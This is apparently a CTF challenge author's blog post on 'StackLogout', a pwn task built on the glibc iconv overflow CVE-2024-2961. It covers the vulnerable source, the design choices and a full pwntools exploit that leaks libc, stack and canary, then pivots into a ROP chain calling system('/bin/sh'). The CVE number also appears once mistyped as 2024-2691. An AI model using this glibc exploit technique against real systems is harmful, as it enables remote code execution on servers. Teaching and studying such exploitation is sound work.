---
title: 赛博杯新生赛 2024 - StackLogout 出题博客
date: 2024/12/22 10:47:00
updated: 2024/12/22 22:44:00
tags:
    - cve
    - stack pivot
    - buffer overflow
    - tricks
    - remote debugging
    - challenge author
sticky: 90
excerpt: 去年4月份左右 *pankas* 转发了一篇推文，讲PHP通杀的，我一看原文，竟然是glibc组件的bug，并且有cve编号。博客很详细，还更了整整3篇，不用调试就能看懂。自从看到CVE-2024-2691的缓冲区溢出，我就一直想着考上一题，这次趁着新生赛，它来了！
thumbnail: /assets/cbctf2024/morebytes.png
---

去年4月份左右 *pankas* 转发了一篇推文，讲PHP通杀的，我一看原文，竟然是glibc组件的bug，
并且有cve编号。博客很详细，还更了整整3篇，不用调试就能看懂。

{% note purple fa-circle-arrow-right %}
查看经典博客：https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
{% endnote %}

自从看到CVE-2024-2691的缓冲区溢出，我就一直想着考上一题，这次趁着新生赛，它来了！

## 出题思路

### 构思

我不打算考太难，于是就打算整一个栈迁移，相对堆来说还是好做的多的，但是又不能太简单，
于是我打算要先泄露信息，才能打栈迁移。我和 *dbgbgtf* 商量了一下，我俩都出栈迁移，
他的简单一点，就叫login，我呢刚好和他相反，叫logout。

我们的漏洞点是差不多的，我们俩都考缓冲区溢出，他的是Off by Null，我的是用cve溢出。

### 变换莫测的栈布局

我第一个写的就是有漏洞的函数，但是不同版本的gcc，不同的变量位置，
会导致相应的栈布局发生变化。正好创新实践的作业可选120行的汇编，于是我先写了一个c
源码作参考，然后开始写汇编：

```c who.c
#include <alloca.h>
#include <iconv.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <immintrin.h>

void who(char *buf, unsigned long size) {
    __m128i zero = _mm_setzero_si128();
    char *tmp = alloca(size);
    char *local = alloca(size);
    unsigned toread = size, readin;
    readin = read(0, local, toread);
    for (int i = 0; i < size; i += 16)
        _mm_store_si128((__m128i *)(local + i), zero);
    __m128i mask = _mm_set1_epi8(0x80);
    for (int i = 0; i < size; i += 16) {
        __m128i data = _mm_load_si128((const __m128i *)(local + i));
        __m128i result = _mm_and_si128(mask, data);
        if (_mm_movemask_epi8(result)) {
            goto convert;
        }
    }
testname:
    printf("Do you confirm? [y/n] ");
    char c = getchar();
    getchar(); // discard \n
    if (c == 'n')
        readin = read(0, local, toread & 0x1f8);
    else if (c != 'y')
        goto testname;
    // c == 'y'
    memcpy(buf, local, readin);
    return;
convert:
    memcpy(tmp, local, size);
    puts("The input contains non-ascii chars!");
    puts("It is needed to be converted to ISO-2022-CN-EXT.");
    iconv_t cd = iconv_open("ISO-2022-CN-EXT", "UTF-8");
    char *pbuf = local, *ptmp = tmp;
    size_t inval = readin, outval = readin;
    iconv(cd, &ptmp, &inval, &pbuf, &outval);
    iconv_close(cd);
}
```

为了熟悉熟悉多字节操作，我还在里面加了点SSE2指令，总之就是memset和memcpy的意思。
汇编代码有将近200行，在这里就不贴了，可以加入协会或等到仓库公开后，
在[我们的仓库](https://github.com/0RAYS/2024-CBCTF/blob/main/Pwn/StackLogout/src/who.s)中找到。

{% folding green::GCC汇编优化命令 %}
在gcc生成的汇编代码中，有许多以.开头的命令，在我的代码中就有许多。

- `.section	.rodata.str1.8,"aMS",@progbits,1`: 生成一个段专门放对齐为8的字符串，最后会合并到
    `.rodata`
- `.p2align 4`: 等价于`.align 2 ** 4`即`.align 16`
- `.equ canary, 8`: 声明一个常量
- `.p2align 4,,10`: 当对齐到16字节边界的代价不超过10字节，则对齐

大部分命令是对齐，可以给现代cpu提供一些加速。例如在[这系列博客](https://agner.org/optimize/)中，
提到了cpu会一次性加载16字节倍数的字节码，因此将字节码对齐到边界后，
jump过来后需要加载的字节码减少了，适合放在热点代码处。
{% endfolding %}

最后写完以后栈布局就是这样：

<img src="/assets/cbctf2024/stackLayout.png" height="50%" width="50%">

在泄露完信息后，通过cve在第一次输入时多写一个字节到`toread`，造成足够长的长度做栈迁移，
然后第二次输入写掉前一个函数的rbp，等待上个函数返回执行栈迁移。

{% notel green fa-candy-cane 隐藏在ELF中的彩蛋 %}
在ELF的注释段有我在汇编中插入的彩蛋哦

<img src="/assets/cbctf2024/easteregg.png" height="70%" width="70%">
{% endnotel %}

### 完善题目背景

既然这道题叫 **StackLogout** ，那么和stack_login对应的，我该整点退出操作，
同时在这些函数里要给选手保留泄露信息的机会。于是我顺理成章地想到了类shell操作，
手搓了一个"Pwn Shell"。并且在`logout`时由于缓冲区没有初始化，留下了信息，
包含了libc、栈和canary。根据`who`函数的逻辑，在函数执行完毕返回时，会将输入的内容复制回
`logout`的`buf`中，不带`'\0'`，而打印缓冲区时使用`%s`，于是造成信息泄露。

![leak](/assets/cbctf2024/leak.png)

### 消失的`leave`

当我把`main`写好，编译一看，`logout`的`leave`被优化没了。原来的计划是`who`通过溢出改
rbp，`logout`再做`leave;ret`实现rop。

尽管我尝试开启`-fno-omit-frame-pointer`，程序确实使用了rbp，不再将其作为临时寄存器，
但是离开函数时仍然没有使用`leave`，而是rsp直接加了一个常数。
只有不开优化才能出现`leave`，没办法了，给它编译时整个特例。并且，
由于之前设计的缓冲区大小是0x130，后期为了做起来简单调小了（不方便溢出多个字节），
因此也没什么地方能写canary，顺便把`logout`的canary关了。

### patchelf失败

题出完了，我想在本地patchelf以后试试，结果不行。我把ubuntu的libc拉下来，但是`iconv_open`
返回-1。我调了老半天，发现为了编码"ISO-2022-CN-EXT"，需要加载其他库，而加载路径是写死的，
由于Arch Linux的默认库路径与ubuntu并不相同，因此无法打开扩展库，也因此无法进行字节转换。

一开始我想放在Roderick的容器上调，但是一旦`apt upgrade`，libc库也会一同更新，
而这些扩展库同属于libc包。而且让新生用这个办法也未免太麻烦了一点。于是我在pwntools
里找其他的解决方案。我试着把程序放到容器中，然后ssh上去调试，结果打开的gdb是容器里的，
没法使用本地的。再次研究gdbserver，假设它的`stdout`连接到`pts/2`，然后在`pts/3`中用gdb
连上去，它的输出仍然出现在`pts/2`中！换言之，输入和输出和是不能通过gdb控制的。

于是我就想到了一个更优雅的办法：起一个容器，用xinetd分发`gdbserver :1337 /home/ctf/pwn`，
这样然后用`pwn.remote`连到xinetd获取程序的输入输出，再用gdb连到1337端口，打开调试，
如此实现了基于远程环境的调试，我也能直接把容器交给选手，方便选手的调试。

### 我的canary在哪里

题目出好了，我拿给 *dbgbgtf* 调试，结果他调试没有canary。这是怎么回事？我在本地尝试，
发现`logout`中缓冲区上留下的canary是由`pwnShell`中运行的`strstr`留下的。在我的机子上，
`strstr@PLT`实际运行了`__strstr_generic`，但是 *dbgbgtf* 机子上却运行着`__strstr_sse2_unaligned`，
而在这个函数中没有设置canary。我直接调试研究这样运行的原因，结果是与cpu特性有关。
我的cpu（R7 6800HS）没有`Fast_Unaligned_Load`，因此使用了`__strstr_generic`。

得，我直接让所有`strstr`强制运行`__strstr_generic`得了。

{% note blue fa-link %}
我强制让`strstr`运行`__strstr_generic`的方法是定义了如下全局变量：
`static char *(* __strstr_generic)(const char *, const char *) = (void *)((size_t)puts + 0x2dc30);`
我原先以为它会在运行时计算，结果在ld加载阶段就算好了，直接放到ro区域了，和别的GOT项一个待遇。
所以由于不同的libc库偏移不同，直接patchelf后运行大概率会挂掉，只能放在容器里调试。
{% endnote %}

## 题解

不需要在`pwnShell`中做其他事，直接`logout`。然后在`who`中输入`\xe0`并确认，以此在`logout`中泄露
libc。类似的，参照上面的图，泄露出stack和canary。然后借助cve把`toread`写成`0x48`，在`who`
中再次输入，覆盖正确的canary并设置rbp。然后在`logout`中确认，成功栈迁移并运行rop链。

![overflow](/assets/cbctf2024/overflow.png)

需要注意的是，覆写rbp时不能留`who`函数的栈帧地址，因为`who`返回到`logout`后还要做`strchr`，
在这个过程中，复制的东西会被覆写掉。还记得`who`退出前把缓冲区中的内容复制回`logout`了吗？
借助这个功能，选择将栈迁移到`logout`的缓冲区即可成功执行rop链。

![rop](/assets/cbctf2024/rop.png)

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './docker/StackLogout'

def payload(lo: int):
    global sh
    global gadgets
    if lo:
        if lo & 2:
            sh = remote('127.0.0.1', 3073)
            gdb.attach(('127.0.0.1', 4097), 'b *who+387', EXE)
        else:
            sh = remote('127.0.0.1', 2049)
    else:
        sh = remote('training.0rays.club', 10016)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.39-0ubuntu8_amd64/libc.so.6')

    def logout(buf: bytes, confirm: bool, go_on: bool, buf2: bytes=b'') -> bytes:
        sh.sendafter(b'user', buf)
        if confirm:
            sh.sendlineafter(b'confirm', b'y')
        else:
            sh.sendlineafter(b'confirm', b'n')
            if lo & 2:
                pause()
            sh.send(buf2)

        sh.recvuntil(b'you? ')                          # strip ' [y/n]'
        return sh.sendlineafter(b' [y/n]', b'n' if go_on else b'y')[:-6]

    sh.sendlineafter(b'psh', b'logout')
    reply = logout(b'\xe0', True, True)
    libcBase = u64(reply + b'\0\0') - libc.symbols['_IO_2_1_stdin_']
    libc.address = libcBase
    success(GOLD_TEXT(f"Leak libcBase: {libcBase:#x}"))

    reply = logout(b'STACK'.rjust(8), True, True)
    # stack under logout is unstable!
    stack = u64(reply[reply.index(b'STACK') + 5:] + b'\0\0') - 0x60
    success(GOLD_TEXT(f"Leak stack: {stack:#x}"))

    reply = logout(b'CANARY'.rjust(0x19), True, True)
    canary = u64(b'\0' + reply[reply.index(b'CANARY') + 6:][:7])
    success(GOLD_TEXT(f"Leak canary: {canary:#x}"))

    gadgets = ROP(libc)
    logout(b'Trigger CVE-2024-2961!!'.ljust(0x2d) + '劄'.encode(), False, False, 
             # system("bin/sh")
        flat(gadgets.rdi.address, next(libc.search(b'/bin/sh')), libc.symbols['system'],
             # _exit(0)
             gadgets.rdi.address, 0, libc.symbols['_exit'],
             0x48, canary, stack - 8))

    sh.clean()
    sh.interactive()
    sh.close()
```

## Overflow more!

可以注意到，原来的博客里说，可以溢出1-3字节，但是此刻我们只溢出了1字节，有没有办法能多溢出呢？
答案是有的。众所周知，中文utf-8占3字节，但是gb2312只占2字节稍微研究一下这个编码可知，
当字符集发生变换，从某个字面跳到某个未出现的字面时，会写入能溢出的4个控制字符，
我称这个写入控制字符的过程为 **膨胀** 。同时，如果转换很多中文字符，那么在转换过程中则会发生
**收缩** 。

假设输入缓冲区和输出缓冲区一致，如果在末尾加一个中文字符，则会溢出4(控制字符)-3(utf-8中文)个字节，
但是倘若我们先转换成中文，并加上大量一样的中文字，则会先膨胀再收缩，实现输出比输入短。
此时再在后面添加一个其他字面的中文，就可以实现3字节溢出。如下图所示，末尾的控制字符超过输入缓冲区
3字节，符合条件：

![overflow more bytes](/assets/cbctf2024/morebytes.png)

不难看到我在重新读入时`toread & 0x1f8`，倘若溢出了2-3字节，则可以溢出写更多字节，变成ret2libc了。
不过由于`who`在退出时还会做一个memcpy，将`rbp - 0x40`位置的字节复制到`rbp + 0x10`，
因此我们溢出的字节的结尾会被payload开头的一部分覆写，需要调整一下发送的payload。
我把patch贴在这里，接下来怎么打ret2libc留给读者思考。

```diff
diff --git a/Pwn/StackLogout/StackLogout.py b/Pwn/StackLogout/StackLogout.py
--- a/Pwn/StackLogout/StackLogout.py
+++ b/Pwn/StackLogout/StackLogout.py
@@ -46,9 +46,9 @@ def payload(lo: int):
     success(GOLD_TEXT(f"Leak canary: {canary:#x}"))

     gadgets = ROP(libc)
-    logout(b'Trigger CVE-2024-2961!!'.ljust(0x2d) + '劄'.encode(), False, False,
+    logout(b'Trigger CVE-2024-2961!!'.ljust(0x24) + '湿湿湿䂚'.encode(), False, False,
              # system("bin/sh")
         flat(gadgets.rdi.address, next(libc.search(b'/bin/sh')), libc.symbols['system'],
              # _exit(0)
              gadgets.rdi.address, 0, libc.symbols['_exit'],
              0x48, canary, stack - 8))
```

## 参考

1. [Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
2. [2024-CBCTF/Pwn/StackLogout/src/who.s at main](https://github.com/0RAYS/2024-CBCTF/blob/main/Pwn/StackLogout/src/who.s)
3. [Software optimization resources. C++ and assembly](https://agner.org/optimize/)
